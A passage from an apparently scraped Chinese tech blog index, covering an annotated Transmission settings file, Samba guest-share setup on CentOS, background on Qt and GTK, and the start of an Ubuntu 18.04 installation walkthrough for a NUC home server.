class=\"comment\">#缓存大小，以MB为单位，建议设大一些，避免频繁读写硬盘而伤硬盘，建议设为内存大小的1/6～1/4</span></span><br><span class=\"line\"><span class=\"string\">&quot;compact-view&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;dht-enabled&quot;</span>: <span class=\"literal\">false</span>, <span class=\"comment\">#关闭DHT（不通过tracker寻找节点）功能，不少PT站的要求，但BT下载设置为true会使得下载更好</span></span><br><span class=\"line\"><span class=\"string\">&quot;download-dir&quot;</span>: <span class=\"string\">&quot;/var/lib/transmission/Downloads&quot;</span>, <span class=\"comment\">#已完成下载的内容存放目录</span></span><br><span class=\"line\"><span class=\"string\">&quot;download-queue-enabled&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;download-queue-size&quot;</span>: 5,</span><br><span class=\"line\"><span class=\"string\">&quot;encryption&quot;</span>: 1, <span class=\"comment\">#0=不加密，1=优先加密，2=必须加密</span></span><br><span class=\"line\"><span class=\"string\">&quot;idle-seeding-limit&quot;</span>: 30,</span><br><span class=\"line\"><span class=\"string\">&quot;idle-seeding-limit-enabled&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;incomplete-dir&quot;</span>: <span class=\"string\">&quot;/var/lib/transmission/Downloads&quot;</span>, <span class=\"comment\">#正在下载的内容存放目录</span></span><br><span class=\"line\"><span class=\"string\">&quot;incomplete-dir-enabled&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;inhibit-desktop-hibernation&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;lpd-enabled&quot;</span>: <span class=\"literal\">false</span>, <span class=\"comment\">#禁用LDP（本地节点发现，用于在本地网络寻找节点）,不少PT站的要求</span></span><br><span class=\"line\"><span class=\"string\">&quot;main-window-height&quot;</span>: 500,</span><br><span class=\"line\"><span class=\"string\">&quot;main-window-is-maximized&quot;</span>: 0,</span><br><span class=\"line\"><span class=\"string\">&quot;main-window-width&quot;</span>: 615,</span><br><span class=\"line\"><span class=\"string\">&quot;main-window-x&quot;</span>: 337,</span><br><span class=\"line\"><span class=\"string\">&quot;main-window-y&quot;</span>: 211,</span><br><span class=\"line\"><span class=\"string\">&quot;message-level&quot;</span>: 2,</span><br><span class=\"line\"><span class=\"string\">&quot;open-dialog-dir&quot;</span>: <span class=\"string\">&quot;/home/yys/\\u684c\\u9762&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;peer-congestion-algorithm&quot;</span>: <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;peer-limit-global&quot;</span>: 240, <span class=\"comment\">#全局连接数</span></span><br><span class=\"line\"><span class=\"string\">&quot;peer-limit-per-torrent&quot;</span>: 60, <span class=\"comment\">#每个种子最多的连接数</span></span><br><span class=\"line\"><span class=\"string\">&quot;peer-port&quot;</span>: 51413, <span class=\"comment\">#预设的port口</span></span><br><span class=\"line\"><span class=\"string\">&quot;peer-port-random-high&quot;</span>: 65535,</span><br><span class=\"line\"><span class=\"string\">&quot;peer-port-random-low&quot;</span>: 49152,</span><br><span class=\"line\"><span class=\"string\">&quot;peer-port-random-on-start&quot;</span>: <span class=\"literal\">false</span>, <span class=\"comment\">#不建议改为true</span></span><br><span class=\"line\"><span class=\"string\">&quot;peer-socket-tos&quot;</span>: <span class=\"string\">&quot;default&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;pex-enabled&quot;</span>: <span class=\"literal\">false</span>, <span class=\"comment\">#禁用PEX（节点交换，用于同已与您相连接的节点交换节点名单）,不少PT站的要求</span></span><br><span class=\"line\"><span class=\"string\">&quot;port-forwarding-enabled&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;preallocation&quot;</span>: 1, <span class=\"comment\">#预分配文件磁盘空间，0=关闭，1=快速，2=完全。建议取1开启该功能，防止下载大半了才发现磁盘不够。取2时，可以减少磁盘碎片，但速度较慢。</span></span><br><span class=\"line\"><span class=\"string\">&quot;prefetch-enabled&quot;</span>: 1,</span><br><span class=\"line\"><span class=\"string\">&quot;queue-stalled-enabled&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;queue-stalled-minutes&quot;</span>: 30,</span><br><span class=\"line\"><span class=\"string\">&quot;ratio-limit&quot;</span>: 2,</span><br><span class=\"line\"><span class=\"string\">&quot;ratio-limit-enabled&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;rename-partial-files&quot;</span>: <span class=\"literal\">true</span>, <span class=\"comment\">#在未完成的文件名后添加后缀.part,false=禁用</span></span><br><span class=\"line\"><span class=\"string\">&quot;rpc-authentication-required&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;rpc-bind-address&quot;</span>: <span class=\"string\">&quot;0.0.0.0&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;rpc-enabled&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;rpc-password&quot;</span>: <span class=\"string\">&quot;&#123;c8c083168db9fff40b5136b6d0f3f4a864110a78\\/oH51JaE&quot;</span>, <span class=\"comment\">#web-ui的密码，可直接修改，重新运行或者reload服务的时候会自动被加密</span></span><br><span class=\"line\"><span class=\"string\">&quot;rpc-port&quot;</span>: 9091, <span class=\"comment\">#默认web-ui的port口，可自行更改</span></span><br><span class=\"line\"><span class=\"string\">&quot;rpc-url&quot;</span>: <span class=\"string\">&quot;/transmission/&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;rpc-username&quot;</span>: <span class=\"string\">&quot;transmission&quot;</span>, <span class=\"comment\">#默认登入名称</span></span><br><span class=\"line\"><span class=\"string\">&quot;rpc-whitelist&quot;</span>: <span class=\"string\">&quot;127.0.0.1&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;rpc-whitelist-enabled&quot;</span>: <span class=\"literal\">true</span>, <span class=\"comment\">#如果你要让其他网段连入，请设false</span></span><br><span class=\"line\"><span class=\"string\">&quot;scrape-paused-torrents-enabled&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;script-torrent-done-enabled&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;script-torrent-done-filename&quot;</span>: <span class=\"string\">&quot;/home/yys&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;seed-queue-enabled&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;seed-queue-size&quot;</span>: 10,</span><br><span class=\"line\"><span class=\"string\">&quot;show-backup-trackers&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;show-extra-peer-details&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;show-filterbar&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;show-notification-area-icon&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;show-options-window&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;show-statusbar&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;show-toolbar&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;show-tracker-scrapes&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;sort-mode&quot;</span>: <span class=\"string\">&quot;sort-by-age&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;sort-reversed&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;speed-limit-down&quot;</span>: 300, <span class=\"comment\">#平时的下载限速</span></span><br><span class=\"line\"><span class=\"string\">&quot;speed-limit-down-enabled&quot;</span>: <span class=\"literal\">true</span>, <span class=\"comment\">#启用平时下载限速</span></span><br><span class=\"line\"><span class=\"string\">&quot;speed-limit-up&quot;</span>: 30, <span class=\"comment\">#平时上传限速</span></span><br><span class=\"line\"><span class=\"string\">&quot;speed-limit-up-enabled&quot;</span>: <span class=\"literal\">true</span>, <span class=\"comment\">#启用平时上传限速</span></span><br><span class=\"line\"><span class=\"string\">&quot;start-added-torrents&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;statusbar-stats&quot;</span>: <span class=\"string\">&quot;total-ratio&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;torrent-added-notification-enabled&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;torrent-complete-notification-enabled&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;torrent-complete-sound-enabled&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;trash-can-enabled&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;trash-original-torrent-files&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;umask&quot;</span>: 18,</span><br><span class=\"line\"><span class=\"string\">&quot;upload-slots-per-torrent&quot;</span>: 14</span><br><span class=\"line\"><span class=\"string\">&quot;utp-enabled&quot;</span>: <span class=\"literal\">true</span>, <span class=\"comment\">#启用μTP协议</span></span><br><span class=\"line\"><span class=\"string\">&quot;watch-dir&quot;</span>: <span class=\"string\">&quot;/home/yys/\\u4e0b\\u8f7d&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;watch-dir-enabled&quot;</span>: <span class=\"literal\">false</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"附录二：Samba-SMB-文件共享服务\"><a href=\"#附录二：Samba-SMB-文件共享服务\" class=\"headerlink\" title=\"附录二：Samba SMB 文件共享服务\"></a>附录二：Samba SMB 文件共享服务</h2><p>SMB（Server Message Block，服务器消息块）是一种<strong>计算机通信协议</strong>（并非一款具体的软件产品），最初由 IBM 开发，用于在本地局域网 LAN 的不同计算机之间共享文件、打印机、串口等资源。</p>\n<p>后来，Microsoft 对其进行了扩展和改进称为 CIFS（Common Internet File System，通用因特网文件系统），在 Windows 操作系统中得到广泛使用，并支持与其他操作系统实现文件共享。</p>\n<p>Samba 是一个开源的软件产品，主要功能是为 Linux 服务器实现文件服务器、身份授权和认证、名称解析和打印服务等功能，其中包含了 SMB 协议的实现，它允许 Windows 客户访问 Linux 系统上的目录、打印机和文件（就像访问 Windows 服务器时一样）。参见 <a href=\"https://www.samba.org/\">https://www.samba.org/</a></p>\n<blockquote>\n<p>Samba 可以在 Linux 服务器上自动构建一个 domain 控制器，以直接使用 Windows 域中的用户凭据。</p>\n</blockquote>\n<p>Samba 的早期版本使用 139 端口在 Windows 网络上建立会话和进行文件共享，但由于缺乏加密和身份验证的支持而存在安全风险。现代版本改用 445 端口，提供了更高的安全性和功能，包括对加密和身份验证的支持。</p>\n<h3 id=\"安装方法\"><a href=\"#安装方法\" class=\"headerlink\" title=\"安装方法\"></a>安装方法</h3><p>Samba 可以直接使用 YUM 软件源进行安装，参见<a href=\"https://www.cnblogs.com/ling-yu-amen/p/10756076.html\">Centos 7 的 Samba 服务安装和配置详解</a>。<br>由于其使用了专用网络端口，注意关闭 selinux 和防火墙。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">yum install -y samba</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"参数配置\"><a href=\"#参数配置\" class=\"headerlink\" title=\"参数配置\"></a>参数配置</h3><p>Samba 的配置文件位于<code>/etc/samba/smb.conf</code>，初始配置信息为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[global]</span><br><span class=\"line\">    workgroup = SAMBA</span><br><span class=\"line\">    security = user             # 安全验证方式，可选：user, share, server, domain</span><br><span class=\"line\"></span><br><span class=\"line\">    passdb backend = tdbsam     # 后端鉴权方式，可选：smbpasswd, tdbsam, ldapsam</span><br><span class=\"line\"></span><br><span class=\"line\">    printing = cups</span><br><span class=\"line\">    printcap name = cups</span><br><span class=\"line\">    load printers = yes</span><br><span class=\"line\">    cups options = raw</span><br><span class=\"line\"></span><br><span class=\"line\">[homes]</span><br><span class=\"line\">    comment = Home Directories</span><br><span class=\"line\">    valid users = %S, %D%w%S</span><br><span class=\"line\">    browseable = No</span><br><span class=\"line\">    read only = No</span><br><span class=\"line\">    inherit acls = Yes</span><br><span class=\"line\"></span><br><span class=\"line\">[printers]</span><br><span class=\"line\">    comment = All Printers</span><br><span class=\"line\">    path = /var/tmp</span><br><span class=\"line\">    printable = Yes</span><br><span class=\"line\">    create mask = 0600</span><br><span class=\"line\">    browseable = No</span><br><span class=\"line\"></span><br><span class=\"line\">[print$]</span><br><span class=\"line\">    comment = Printer Drivers</span><br><span class=\"line\">    path = /var/lib/samba/drivers</span><br><span class=\"line\">    write list = @printadmin root</span><br><span class=\"line\">    force group = @printadmin</span><br><span class=\"line\">    create mask = 0664</span><br><span class=\"line\">    directory mask = 0775</span><br></pre></td></tr></table></figure>\n\n<p>用户可以设置文件共享目录，方法是在配置文件中增加如下信息：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[transmission]</span><br><span class=\"line\">    comment = transmission                      # 连接服务器的提示信息</span><br><span class=\"line\">    path = /var/lib/transmission/Downloads/     # 共享目录的绝对路径</span><br><span class=\"line\">    public = yes                                # 允许公开</span><br><span class=\"line\">    browseable = yes                            # 允许浏览目录</span><br><span class=\"line\">    writable = yes                              # 允许写入</span><br><span class=\"line\">    guest ok = yes                              # 允许 guest 登录，无需用户名和口令</span><br><span class=\"line\">    create mask = 0644                  </span><br><span class=\"line\">    directory mask = 0775</span><br></pre></td></tr></table></figure>\n\n<p>为了支持 guest 匿名登录，还需要修改 <code>[global]</code> 段落的配置信息，注释取消 <code>passdb backend = tdbsam</code> ，并增加以下信息，即以 <code>transmission</code> 用户身份读写文件。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">map to guest = bad user</span><br><span class=\"line\">guest account = transmission</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"启动方式\"><a href=\"#启动方式\" class=\"headerlink\" title=\"启动方式\"></a>启动方式</h3><p>注意 Samba 的系统服务名称为<code>smb.service</code>，因此其启动方式为：</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@Copy-of-VM-Centos7 ~]# systemctl enable --now smb</span><br><span class=\"line\">Created symlink from /etc/systemd/system/multi-user.target.wants/smb.service to /usr/lib/systemd/system/smb.service.</span><br><span class=\"line\"></span><br><span class=\"line\">[root@Copy-of-VM-Centos7 ~]# systemctl status smb</span><br><span class=\"line\">● smb.service - Samba SMB Daemon</span><br><span class=\"line\">   Loaded: loaded (/usr/lib/systemd/system/smb.service; enabled; vendor preset: disabled)</span><br><span class=\"line\">   Active: active (running) since 六 2024-08-31 15:49:08 CST; 6s ago</span><br><span class=\"line\">     Docs: man:smbd(8)</span><br><span class=\"line\">           man:samba(7)</span><br><span class=\"line\">           man:smb.conf(5)</span><br><span class=\"line\"> Main PID: 1376 (smbd)</span><br><span class=\"line\">   Status: &quot;smbd: ready to serve connections...&quot;</span><br><span class=\"line\">   CGroup: /system.slice/smb.service</span><br><span class=\"line\">           ├─1376 /usr/sbin/smbd --foreground --no-process-group</span><br><span class=\"line\">           ├─1378 /usr/sbin/smbd --foreground --no-process-group</span><br><span class=\"line\">           ├─1379 /usr/sbin/smbd --foreground --no-process-group</span><br><span class=\"line\">           └─1380 /usr/sbin/smbd --foreground --no-process-group</span><br><span class=\"line\"></span><br><span class=\"line\">8月 31 15:49:07 Copy-of-VM-Centos7.8-local systemd[1]: Starting Samba SMB Daemon...</span><br><span class=\"line\">8月 31 15:49:08 Copy-of-VM-Centos7.8-local smbd[1376]: [2024/08/31 15:49:08.961337,  0] ../../lib/util/become_daemon.c:136(daemon_ready)</span><br><span class=\"line\">8月 31 15:49:08 Copy-of-VM-Centos7.8-local systemd[1]: Started Samba SMB Daemon.</span><br><span class=\"line\">8月 31 15:49:08 Copy-of-VM-Centos7.8-local smbd[1376]:   daemon_ready: daemon &#x27;smbd&#x27; finished starting up and ready to serve connections</span><br></pre></td></tr></table></figure>\n\n<p>SMB 服务启动成功后，客户端 mac 电脑就可以通过 <code>Finder</code> - <code>前往</code> - <code>连接服务器</code>，并输入<code>smb://192.168.0.x</code> 连接共享目录了！</p>\n<h2 id=\"附录三：关于Qt-和-GTK\"><a href=\"#附录三：关于Qt-和-GTK\" class=\"headerlink\" title=\"附录三：关于Qt 和 GTK\"></a>附录三：关于Qt 和 GTK</h2><h3 id=\"Qt\"><a href=\"#Qt\" class=\"headerlink\" title=\"Qt\"></a>Qt</h3><p>1991年，Haavard Nord 和 Eirik Chambe-Eng 开发了 Qt ，该工具包名为 Qt 是因为字母 Q 在 Haavard 的 Emacs 字体特别漂亮，而 t 代表 toolkit，灵感来自 Xt，X toolkit。<br>后来，两人成立了 Trolltech 公司（中文名是“奇趣科技”），2008年被 NOKIA 公司收购，以增强该公司在跨平台软件研发方面的实力，更名 Qt Software并 宣布开放 Qt 源代码，<br>2012年8月9日，Digia 宣布已完成对诺基亚 Qt 业务及软件技术的全面收购，并计划将 Qt 应用到 Android、iOS 及Windows 8 平台上。</p>\n<p>Qt 的图形用户界面的基础是 QWidget。Qt 中所有类型的 GUI 组件如按钮、标签、工具栏等都派生自 QWidget，而QWidget 本身则为 QObject 的子类。Widget 负责接收鼠标，键盘和来自窗口系统的其他事件，并描绘了自身显示在屏幕上。每一个 GUI 组件都是一个 widget，widget 还可以作为容器，在其内包含其他 Widget。<br>使用 Qt 开发的软件，相同的代码可以在任何支持的平台上编译与执行，而不需要修改源代码。会自动依平台的不同，表现平台特有的图形界面风格。<br>Qt 开放源代码，并提供 LGPL 和 GPL 的自由软件用户协议，可以免费使用，但商业版需收取授权费。</p>\n<p>KDE Plasma Workspaces 就是基于 Qt 开发的 Linux GUI，此外 Symbain、MeeGo 等手机厂商也采用 Qt 框架，但现在已经是 Android 的天下了！！！</p>\n<h3 id=\"GTK\"><a href=\"#GTK\" class=\"headerlink\" title=\"GTK\"></a>GTK</h3><p>GTK（原名GTK+）最初是 GIMP 的专用开发库（GIMP Toolkit），后来发展为类 Unix 系统下开发图形界面的应用程序的主流开发工具之一。<br>GTK 是自由软件，并且是 GNU 计划的一部分。自 2019 年 2 月 6 日起，GTK+ 改名为 GTK。<br>GTK 使用 C 语言开发，但使用了面向对象技术，也提供了C++（gtkmm）、Perl、Ruby、Java 和 Python（PyGTK）绑定，其他的绑定有 Ada、D、Haskell、PHP和 所有的 .NET 编程语言。</p>\n<p>GNOME 是以 GTK 为基础，就是说使用 GTK 做为其工具箱，Firefox 也是基于 GTK 开发的。</p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://transmissionbt.com/\">Transmission 的官网 - transmissionbt.com</a></li>\n<li><a href=\"https://github.com/transmission/transmission\">Transmission 的源码</a></li>\n<li><a href=\"https://github.com/transmission/transmission/blob/main/docs/Editing-Configuration-Files.md\">settings.json 的参数设置</a></li>\n<li><a href=\"https://zh.wikipedia.org/wiki/Qt\">Qt 的 Wiki</a></li>\n<li><a href=\"https://zh.wikipedia.org/wiki/GTK\">GTK 的 Wiki</a></li>\n<li><a href=\"https://blog.uuz.moe/2017/02/install_transmission/\">Transmission 的安装与配置 - Ubuntu发行版</a></li>\n<li><a href=\"https://wiki.archlinux.org/title/Transmission_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#%E6%8E%A5%E6%94%B6/%E5%8F%91%E9%80%81%E7%BC%93%E5%86%B2%E5%8C%BA%E8%AE%BE%E7%BD%AE%E5%A4%B1%E8%B4%A5\">Transmission 的安装与配置 - Archlinux发行版</a></li>\n<li><a href=\"http://ronhks.hu/2018/12/30/transmission-network-problem/\">UDP缓冲区不足导致daemon启动失败的解决方案</a></li>\n</ul>\n"},{"title":"Ubuntu 18.04.4的安装步骤","url":"/2020/06/20/Ubuntu-18-04-4%E7%9A%84%E5%AE%89%E8%A3%85%E6%AD%A5%E9%AA%A4/","content":"<p>这几天折腾NUC主机，在安装Ubuntu 18.04.4 LTS（长期支持的稳定版本）的过程中遇到不少坑，立此存照吧。</p>\n<h2 id=\"Step-0：安装前的准备工作\"><a href=\"#Step-0：安装前的准备工作\" class=\"headerlink\" title=\"Step 0：安装前的准备工作\"></a>Step 0：安装前的准备工作</h2><p>已安装内存和硬盘的NUC主机之外，还需要：</p>\n<ul>\n<li><p>独立显示器：感谢LP赞助的DELL S2319SP</p>\n</li>\n<li><p>USB键盘 + USB鼠标：开机BIOS设置硬件启动顺序时键盘操作不方便</p>\n</li>\n<li><p>有线网络接口：备用先不接</p>\n</li>\n<li><p>Ubuntu启动U盘：制作方法参见<a href=\"%E5%A6%82%E4%BD%95%E5%88%B6%E4%BD%9CUbuntu%E7%9A%84USB%E5%90%AF%E5%8A%A8%E7%9B%98.md\">如何制作Ubuntu的USB启动盘</a>，Server版本912M，Desktop版本2.13G</p>\n</li>\n</ul>\n<h2 id=\"Step-1-安装Ubuntu-Server\"><a href=\"#Step-1-安装Ubuntu-Server\" class=\"headerlink\" title=\"Step 1: 安装Ubuntu Server\"></a>Step 1: 安装Ubuntu Server</h2><ol>\n<li><p>插入Ubuntu安装U盘，开机启动后进入安装界面，各种参数选默认</p>\n</li>\n<li><p>完成安装后拔出U盘，重新启动并登录进入新安装的Ubuntu Server<br>开机启动过程中，可能需要在BIOS设置启动顺序（USB—STAT—LAN），进入方法是加电过程中持续按F2<br>强烈建议安装Openssh Server，以后可以拔掉键盘和鼠标，直接远程登录管理主机<br>安装过程中需要设置一个默认用户，root尚未激活<br>由于安装过程中未接网线，完成后所有网络接口都不可用</p>\n <img src=\"/2020/06/20/Ubuntu-18-04-4%E7%9A%84%E5%AE%89%E8%A3%85%E6%AD%A5%E9%AA%A4/intel-bios.png\" class=\"\"></li>\n</ol>\n<h2 id=\"step-2-激活root用户\"><a href=\"#step-2-激活root用户\" class=\"headerlink\" title=\"step 2: 激活root用户\"></a>step 2: 激活root用户</h2><ol>\n<li><p>以默认用户身份设置root口令，并切换到root</p>\n <figure class=\"highlight cmd\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">sj@nuc5i3:~$ <span class=\"title\">sudo</span> <span class=\"title\">passwd</span> <span class=\"title\">root</span></span></span><br><span class=\"line\"><span class=\"function\">[<span class=\"title\">sudo</span>] <span class=\"title\">password</span> <span class=\"title\">for</span> <span class=\"title\">sj</span>:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">Enter</span> <span class=\"title\">new</span> <span class=\"title\">UNIX</span> <span class=\"title\">password</span>:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">Retype</span> <span class=\"title\">new</span> <span class=\"title\">UNIX</span> <span class=\"title\">password</span>:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">passwd</span>: <span class=\"title\">password</span> <span class=\"title\">updated</span> <span class=\"title\">successfully</span></span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">sj</span>@<span class=\"title\">nuc5i3</span>:~$ <span class=\"title\">su</span> -</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">Password</span>:</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">root</span>@<span class=\"title\">nuc5i3</span>:~#</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>如果需要允许root用户远程登录，修改配置文件<code>/etc/ssh/sshd_config</code>，将<code>PermitRootLogin</code>改为<code>yes</code></p>\n <figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">#PermitRootLogin prohibit-password</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"Step-3-设置有线网络接入\"><a href=\"#Step-3-设置有线网络接入\" class=\"headerlink\" title=\"Step 3: 设置有线网络接入\"></a>Step 3: 设置有线网络接入</h2><ol>\n<li><p>插入有线网络，没啥动静？ 别着急，还没配置网络参数呢！</p>\n</li>\n<li><p>编辑网卡配置文件<code>/etc/netplan/50-cloud-init.yaml</code>，至少需要设置IP地址和默认网关</p>\n <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># This file is generated from information provided by the datasource.  Changes</span></span><br><span class=\"line\"><span class=\"comment\"># to it will not persist across an instance reboot.  To disable cloud-init&#x27;s</span></span><br><span class=\"line\"><span class=\"comment\"># network configuration capabilities, write a file</span></span><br><span class=\"line\"><span class=\"comment\"># /etc/cloud/cloud.cfg.d/99-disable-network-config.cfg with the following:</span></span><br><span class=\"line\"><span class=\"comment\"># network: &#123;config: disabled&#125;</span></span><br><span class=\"line\"><span class=\"attr\">network:</span></span><br><span class=\"line\">    <span class=\"attr\">version:</span> <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"attr\">ethernets:</span></span><br><span class=\"line\">        <span class=\"attr\">enp0s25:</span></span><br><span class=\"line\">            <span class=\"attr\">dhcp4:</span> <span class=\"literal\">no</span></span><br><span class=\"line\">            <span class=\"attr\">addresses:</span> [<span class=\"number\">192.168</span><span class=\"number\">.0</span><span class=\"number\">.130</span><span class=\"string\">/24</span>]</span><br><span class=\"line\">            <span class=\"attr\">gateway4:</span> <span class=\"number\">192.168</span><span class=\"number\">.0</span><span class=\"number\">.1</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>使用<code>netpaln generate</code>刷新网络配置，<code>netplan apply</code>启动有线网卡<br>最后用<code>ifconfig</code>检查网络状态，确认有线网卡<code>enp0s25</code>启动成功</p>\n <figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@nuc5i3:/etc/netplan# netplan generate</span><br><span class=\"line\">root@nuc5i3:/etc/netplan# netplan apply</span><br><span class=\"line\"></span><br><span class=\"line\">root@nuc5i3:/etc/netplan# ifconfig</span><br><span class=\"line\">enp0s25: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class=\"line\">        inet 192.168.0.130  netmask 255.255.255.0  broadcast 192.168.0.255</span><br><span class=\"line\">        inet6 fe80::baae:edff:fe73:87fb  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class=\"line\">        ether b8:ae:ed:73:87:fb  txqueuelen 1000  (Ethernet)</span><br><span class=\"line\">        RX packets 23068  bytes 14045959 (14.0 MB)</span><br><span class=\"line\">        RX errors 0  dropped 23  overruns 0  frame 0</span><br><span class=\"line\">        TX packets 12173  bytes 1273580 (1.2 MB)</span><br><span class=\"line\">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class=\"line\">        device interrupt 20  memory 0xf7100000-f7120000  </span><br><span class=\"line\"></span><br><span class=\"line\">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class=\"line\">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class=\"line\">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class=\"line\">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class=\"line\">        RX packets 144  bytes 13680 (13.6 KB)</span><br><span class=\"line\">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class=\"line\">        TX packets 144  bytes 13680 (13.6 KB)</span><br><span class=\"line\">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"Step-4-设置DNS服务\"><a href=\"#Step-4-设置DNS服务\" class=\"headerlink\" title=\"Step 4: 设置DNS服务\"></a>Step 4: 设置DNS服务</h2><ol>\n<li><p>在基本安装完成后，默认DNS指向的是<code>127.0.0.53:53</code>，无法解析公网域名！！！<br>解决办法：停止并禁用系统默认的DNS服务<code>systemd-resolved</code>，并删除<code>/etc/resolv.conf</code>软连接</p>\n <figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@nuc5i3:~# ping t.cn</span><br><span class=\"line\">ping: t.cn: Temporary failure in name resolution</span><br><span class=\"line\"></span><br><span class=\"line\">root@nuc5i3:~# netstat -tunpl</span><br><span class=\"line\">Active Internet connections (only servers)</span><br><span class=\"line\">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class=\"line\">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      1001/systemd-resolv</span><br><span class=\"line\">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      2012/sshd</span><br><span class=\"line\">tcp6       0      0 :::22                   :::*                    LISTEN      2012/sshd</span><br><span class=\"line\">udp        0      0 127.0.0.53:53           0.0.0.0:*                           1001/systemd-resolv</span><br><span class=\"line\"></span><br><span class=\"line\">root@nuc5i3:~# systemctl stop systemd-resolved</span><br><span class=\"line\">root@nuc5i3:~# systemctl disable systemd-resolved</span><br><span class=\"line\">root@nuc5i3:~# systemctl status systemd-resolved</span><br><span class=\"line\">● systemd-resolved.service - Network Name Resolution</span><br><span class=\"line\">Loaded: loaded (/lib/systemd/system/systemd-resolved.service; disabled; vendor preset: enabled)</span><br><span class=\"line\">Active: inactive (dead)</span><br><span 